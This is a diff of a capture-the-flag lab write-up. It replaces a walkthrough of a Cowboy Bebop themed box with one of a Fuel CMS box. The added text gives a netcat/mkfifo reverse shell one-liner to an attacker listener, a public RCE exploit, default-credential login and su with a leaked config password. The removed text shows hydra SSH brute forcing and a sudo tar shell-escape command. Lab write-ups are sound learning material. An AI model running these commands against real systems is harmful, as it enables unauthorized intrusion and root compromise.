@@ -19,46 +19,60 @@ nav_order: 18
 
 ## Box Description
 
-> A Cowboy Bebop themed box where you must prove you are the greatest hacker in the galaxy.
+> A new start-up has a few issues with their web server.
 
 ## Recon
-As always I start off with ```nmap -sC -sV -vv ip``` on the target box. This scan revealed that the target box has a webserver running on ```port 80```, ssh running on ```port 22```, and ftp running on ```port 21``` with anonymous login available. 
+As always I start off with ```nmap -sC -sV -vv ip``` on the target box. This scan revealed that the target box has a webserver running on ```port 80```.
 
-Visiting the webpage via Firefox, we are greeted with a request from the crew to gain root access to a system. 
+Visiting the webpage via Firefox, we are greeted by a Fuel CMS setup page, and at the bottom, we find the information that the default creds are ```admin:admin```; lets try them out.
 
-<img width="1909" height="871" alt="image" src="https://github.com/user-attachments/assets/e26c49f2-6ba7-472c-9983-f81a67d67cef" />
+The default creds worked and now we have access to the admin panel of the CMS.
 
-Given that this is a web server, I run a gobuster scan in the background while enumerating to hopefully gain some usefuil info using ```gobuster dir http://ip -w /usr/share/worlists/dirbuster/small.txt```.
+I played around the settings a bit, but was having trouble with executing my php files, so I pivoted to a different exploit.
 
-I then logged into the frp service and found two interesting files: ```locks.txt``` & ```task.txt```.
+Using ```searchsploit fuel cms```, I found a python script exploiting a rce vulnerability on the exact version I was on.
 
-<img width="363" height="525" alt="image" src="https://github.com/user-attachments/assets/8586995c-05b8-471a-8745-ce8e2b1798e5" />
+Downloading that script, I executed the script by providing the url and had rce.
 
-The output of ```locks.txt``` appears to be a password list and there is a potential username at the end of ```task.txt```.
+Now this wasn't a reverse shell, it would take your command then go back to the working directory you originated at which was kind of annoying.
 
-Gobuster did not come back fruitful and the only service with a login on teh box was ssh, so I decided to pull on this thread to see where it led.
+I set up a listener on another terminal session and executed ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST PORT >/tmp/f``` via the rce exploit python script and got a callback, nice.
 
-I set up hydra to try and brute force the ssh login with the username ```lin``` and the worlist of ```locks.txt``` using ```hydra -l lin -P locks.txt ssh://ip -t 4 -v``` and I got a valid pair of credentials! ヾ(≧▽≦*)o
+<img width="737" height="34" alt="image" src="https://github.com/user-attachments/assets/f7b74285-5771-4bda-93f8-4839f2d697e7" />
 
-<img width="1656" height="244" alt="Screenshot 2026-06-30 164523" src="https://github.com/user-attachments/assets/fa73f4d2-762f-4b3a-898a-814f7151c46a" />
+Upon getting this reverse shell, I upgraded my shell using python, and began searching for suid binaries to exploit but was unable to find any.
+
+I also tried ```sudo -l``` for any sudo misconfigurations but I needed the password so no luck there.
+
+After being stumped for a bit, I decided to try out ```linpeas.sh``` and see if I could find anything nice.
+
+Searching through the output, I found some interesting pathways, but nothing that would give me root.
+
+Then I noticed that linpeas.sh found a password in a config php file.
+
+<img width="666" height="58" alt="image" src="https://github.com/user-attachments/assets/7d0a7665-fde3-4ff0-ad7d-6ef6337d5b2d" />
+
+<img width="526" height="36" alt="image" src="https://github.com/user-attachments/assets/c9d97455-629e-44e4-a140-32c42a4cdbfa" />
+
+---
 
 ## Priv Esc
-Using these credentials, I logged into ssh and looked for any suid binaries with ```find / /perm -u=s 2>/dev/null | grep /usr/```. After cross referencing a couple of the binaries with GTFObins, I remembered that I still hadn't performed ```sudo -l``` so I did that and found that I could run ```/bin/tar``` as ```root``` on this machine.
+With this password, I tried to execute ```su```, input the password when prompted, and got root privileges.
 
-I searched GTFObins for this binary and found an entry to reference.
+<img width="343" height="161" alt="image" src="https://github.com/user-attachments/assets/fb1c3944-4c95-43ee-af11-429a99287078" />
 
-<img width="979" height="481" alt="image" src="https://github.com/user-attachments/assets/7b6e0196-649c-40f8-ab10-24f48f08917a" />
-
-Using this, I did ```sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```, got a root shell, and pwned the box.
+---
 
 ## Solution Steps
 
-1. Brute force ssh login with info from ftp .txt files.
-2. ```sudo -l``` to find /bin/tar can be ran as root
-3. privesc with ```sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
+1. Use Fuel CMS RCE exploit via python script
+2. execute ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST PORT >/tmp/f```
+3. get password from config php file
+4. execute ```su``` with password and get root
+
 
 ## Thoughts
-I thought this was a pretty fun box to pwn, I always find it satisfying to suddenyl see the root shell prompt. Even though this was an easy box, I am still proud of myself because this is the first box I completed without having to refernce a writeup!
+I thought this box was pretty easy, but it was nice seeing a config file based attack path which you dont see often for easy boxes. The only issue I had was executing a reverse shell with the rce script but it just taught me that the ```nc mkfifo``` reverse shell command is the most reliable.
 
 --
 
